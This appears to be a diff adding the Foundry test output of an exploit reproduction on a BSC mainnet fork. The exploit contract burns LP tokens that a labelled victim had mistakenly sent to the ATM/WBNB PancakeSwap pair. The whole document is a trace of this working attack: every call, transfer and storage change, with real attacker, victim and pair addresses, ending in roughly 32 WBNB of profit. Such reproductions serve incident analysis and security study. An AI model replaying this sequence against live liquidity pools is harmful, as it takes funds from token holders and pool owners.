@@ -1,0 +1,154 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/ATM_LP_Burn_exp.sol:ContractTest
+[PASS] testExploit() (gas: 925401)
+Logs:
+  Attacker Before exploit WBNB Balance: 1.108972216356650216
+  Attacker After exploit WBNB Balance: 33.188756502372989017
+
+Traces:
+  [36611] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("bsc", 105692847 [1.056e8])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(Attacker EOA: [0x0EB4075C87cCD23a7AE1E00D77B043e4e8cC5894], "Attacker EOA")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Victim / mistaken LP owner: [0xBE8351C14e5108A57A545DFA8669Fa31aA6aDC68], "Victim / mistaken LP owner")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA], "ATM/WBNB Pancake pair")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], "WBNB")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(ATM: [0xFdC76B8b2F775656E8A867FcC3282c969D2d86b0], "ATM")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Final WBNB receiver: [0xfBa52f861E79C46333A308ba8f86bf136A44B2D3], "Final WBNB receiver")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Builder payment receiver: [0x1266C6bE60392A8Ff346E8d5ECCd3E69dD9c5F20], "Builder payment receiver")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Dust WBNB receiver: [0xa44729b6039C1A9Aa3D8e6AD063d66e7ca18B06b], "Dust WBNB receiver")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [998301] ContractTest::testExploit()
+    ├─ [3264] WBNB::symbol() [staticcall]
+    │   └─ ← [Return] "WBNB"
+    ├─ [2534] WBNB::balanceOf(Final WBNB receiver: [0xfBa52f861E79C46333A308ba8f86bf136A44B2D3]) [staticcall]
+    │   └─ ← [Return] 1108972216356650216 [1.108e18]
+    ├─ [2444] WBNB::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker Before exploit WBNB Balance", val: 1108972216356650216 [1.108e18], decimals: 18)
+    ├─ [631661] → new AtmLpBurnExploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 3153 bytes of code
+    ├─ [534] WBNB::balanceOf(Final WBNB receiver: [0xfBa52f861E79C46333A308ba8f86bf136A44B2D3]) [staticcall]
+    │   └─ ← [Return] 1108972216356650216 [1.108e18]
+    ├─ [2537] ATM/WBNB Pancake pair::balanceOf(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA]) [staticcall]
+    │   └─ ← [Return] 400498341357466415661652 [4.004e23]
+    ├─ [0] VM::assertGt(400498341357466415661652 [4.004e23], 400000000000000000000000 [4e23], "pair should hold mistaken LP") [staticcall]
+    │   └─ ← [Return]
+    ├─ [2537] ATM/WBNB Pancake pair::balanceOf(Victim / mistaken LP owner: [0xBE8351C14e5108A57A545DFA8669Fa31aA6aDC68]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "LP owner already sent LP") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(Attacker EOA: [0x0EB4075C87cCD23a7AE1E00D77B043e4e8cC5894])
+    │   └─ ← [Return]
+    ├─ [277980] AtmLpBurnExploit::attack()
+    │   ├─ [191846] ATM/WBNB Pancake pair::burn(AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─ [2534] WBNB::balanceOf(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA]) [staticcall]
+    │   │   │   └─ ← [Return] 1603989214300816940000 [1.603e21]
+    │   │   ├─ [2973] ATM::balanceOf(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA]) [staticcall]
+    │   │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
+    │   │   ├─ [2354] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::feeTo() [staticcall]
+    │   │   │   └─ ← [Return] 0x0ED943Ce24BaEBf257488771759F9BF482C39706
+    │   │   ├─ emit Transfer(from: ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA], to: 0x0000000000000000000000000000000000000000, value: 400498341357466415661652 [4.004e23])
+    │   │   ├─ [27962] WBNB::transfer(AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1603989214300816939995 [1.603e21])
+    │   │   │   ├─ emit Transfer(from: ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA], to: AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1603989214300816939995 [1.603e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0632df5418c7b3b11aec66b3baf3d30d014bfbff0ab15f187c33c5cff5b6e5a1: 0x000000000000000000000000000000000000000000000056f3d26c1b861a1be0 → 5
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x000000000000000000000000000000000000000000000056f3d26c1b861a1bdb
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [42329] ATM::transfer(AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 99999999999999999999750311 [9.999e25])
+    │   │   │   ├─ emit Transfer(from: ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA], to: AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 99999999999999999999750311 [9.999e25])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x00000000000000000000000000000000000000000052b7d2dcc80cd2e3fc30a7
+    │   │   │   │   @ 0x7c9985cff4e4ba20229bfa7d5788838832eece752ada5d87560430496989c1a6: 0x00000000000000000000000000000000000000000052b7d2dcc80cd2e4000000 → 249689
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WBNB::balanceOf(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA]) [staticcall]
+    │   │   │   └─ ← [Return] 5
+    │   │   ├─ [973] ATM::balanceOf(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA]) [staticcall]
+    │   │   │   └─ ← [Return] 249689 [2.496e5]
+    │   │   ├─ emit Sync(reserve0: 5, reserve1: 249689 [2.496e5])
+    │   │   ├─ emit Burn(sender: AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0: 1603989214300816939995 [1.603e21], amount1: 99999999999999999999750311 [9.999e25], to: AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   ├─  storage changes:
+    │   │   │   @ 11: 0x0000000000000000000000001c1889510c30fc2906ac934005289e9380000000 → 0x0000000000000000000000000000000000000000000000000000000000130cbd
+    │   │   │   @ 0: 0x0000000000000000000000000000000000000000000054cf0effad7619aa063c → 1000
+    │   │   │   @ 8: 0x6a38fee100000052b7d2dcc80cd2e4000000000000000056f3d26c1b861a1be0 → 0x6a38ff1a000000000000000000000003cf590000000000000000000000000005
+    │   │   │   @ 0x1aadde701eb21b2d3e951b9931525772effe14ba1a6facaeb3c9ca2ebc2cd16f: 0x0000000000000000000000000000000000000000000054cf0effad7619aa0254 → 0
+    │   │   │   @ 9: 0 → 0x000000000000000000000000000000363967db0d0491d8f5501e1c34689ba5c1
+    │   │   │   @ 10: 0 → 0x000000000000000000000000000000000000003beaf84b697edbdfa7adc68d6f
+    │   │   └─ ← [Return] 1603989214300816939995 [1.603e21], 99999999999999999999750311 [9.999e25]
+    │   ├─ [5629] ATM::transfer(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA], 99999999999999999999750311 [9.999e25])
+    │   │   ├─ emit Transfer(from: AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA], value: 99999999999999999999750311 [9.999e25])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000052b7d2dcc80cd2e3fc30a7 → 0
+    │   │   │   @ 0x7c9985cff4e4ba20229bfa7d5788838832eece752ada5d87560430496989c1a6: 249689 → 0x00000000000000000000000000000000000000000052b7d2dcc80cd2e4000000
+    │   │   └─ ← [Return] true
+    │   ├─ [534] WBNB::balanceOf(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA]) [staticcall]
+    │   │   └─ ← [Return] 5
+    │   ├─ [23597] ATM/WBNB Pancake pair::swap(4, 0, Dust WBNB receiver: [0xa44729b6039C1A9Aa3D8e6AD063d66e7ca18B06b], 0x)
+    │   │   ├─ [8062] WBNB::transfer(Dust WBNB receiver: [0xa44729b6039C1A9Aa3D8e6AD063d66e7ca18B06b], 4)
+    │   │   │   ├─ emit Transfer(from: ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA], to: Dust WBNB receiver: [0xa44729b6039C1A9Aa3D8e6AD063d66e7ca18B06b], value: 4)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x3bc24a4c5d5d11358266820988a1b0523f4f6f491b4001daf35881ebd524207f: 0x00000000000000000000000000000000000000000000000008bb68dd5ec596a2 → 0x00000000000000000000000000000000000000000000000008bb68dd5ec596a6
+    │   │   │   │   @ 0x0632df5418c7b3b11aec66b3baf3d30d014bfbff0ab15f187c33c5cff5b6e5a1: 5 → 1
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [534] WBNB::balanceOf(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA]) [staticcall]
+    │   │   │   └─ ← [Return] 1
+    │   │   ├─ [973] ATM::balanceOf(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA]) [staticcall]
+    │   │   │   └─ ← [Return] 100000000000000000000000000 [1e26]
+    │   │   ├─ emit Sync(reserve0: 1, reserve1: 100000000000000000000000000 [1e26])
+    │   │   ├─ emit Swap(sender: AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0In: 0, amount1In: 99999999999999999999750311 [9.999e25], amount0Out: 4, amount1Out: 0, to: Dust WBNB receiver: [0xa44729b6039C1A9Aa3D8e6AD063d66e7ca18B06b])
+    │   │   ├─  storage changes:
+    │   │   │   @ 8: 0x6a38ff1a000000000000000000000003cf590000000000000000000000000005 → 0x6a38ff1a00000052b7d2dcc80cd2e40000000000000000000000000000000001
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WBNB::balanceOf(AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 1603989214300816939995 [1.603e21]
+    │   ├─ [23162] WBNB::transfer(AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1603989214300816939995 [1.603e21])
+    │   │   ├─ emit Transfer(from: AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 1603989214300816939995 [1.603e21])
+    │   │   └─ ← [Return] true
+    │   ├─ [9195] WBNB::withdraw(1571909430014800601194 [1.571e21])
+    │   │   ├─ [55] AtmLpBurnExploit::receive{value: 1571909430014800601194}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit Withdrawal(src: AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], wad: 1571909430014800601194 [1.571e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x000000000000000000000000000000000000000000000056f3d26c1b861a1bdb → 0x000000000000000000000000000000000000000000000001bd3249d797297b71
+    │   │   └─ ← [Stop]
+    │   ├─ [0] Builder payment receiver::fallback{value: 1571909430014800601194}()
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WBNB::balanceOf(AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 32079784286016338801 [3.207e19]
+    │   ├─ [6062] WBNB::transfer(Final WBNB receiver: [0xfBa52f861E79C46333A308ba8f86bf136A44B2D3], 32079784286016338801 [3.207e19])
+    │   │   ├─ emit Transfer(from: AtmLpBurnExploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: Final WBNB receiver: [0xfBa52f861E79C46333A308ba8f86bf136A44B2D3], value: 32079784286016338801 [3.207e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x000000000000000000000000000000000000000000000001bd3249d797297b71 → 0
+    │   │   │   @ 0x4f7b946ba82ed31e351ab32ad02d9a05161707b5664dbae46e041a3150113280: 0x0000000000000000000000000000000000000000000000000f63dc5aedb73ce8 → 0x000000000000000000000000000000000000000000000001cc96263284e0b859
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [534] WBNB::balanceOf(Final WBNB receiver: [0xfBa52f861E79C46333A308ba8f86bf136A44B2D3]) [staticcall]
+    │   └─ ← [Return] 33188756502372989017 [3.318e19]
+    ├─ [0] VM::assertGt(32079784286016338801 [3.207e19], 32000000000000000000 [3.2e19], "final receiver WBNB profit") [staticcall]
+    │   └─ ← [Return]
+    ├─ [537] ATM/WBNB Pancake pair::balanceOf(ATM/WBNB Pancake pair: [0x9753A64fB7C233Fdc43f04daB9CcA88e1e229eBA]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "pair LP burned") [staticcall]
+    │   └─ ← [Return]
+    ├─ [1264] WBNB::symbol() [staticcall]
+    │   └─ ← [Return] "WBNB"
+    ├─ [534] WBNB::balanceOf(Final WBNB receiver: [0xfBa52f861E79C46333A308ba8f86bf136A44B2D3]) [staticcall]
+    │   └─ ← [Return] 33188756502372989017 [3.318e19]
+    ├─ [444] WBNB::decimals() [staticcall]
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker After exploit WBNB Balance", val: 33188756502372989017 [3.318e19], decimals: 18)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.47s (11.99ms CPU time)
+
+Ran 1 test suite in 1.47s (1.47s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
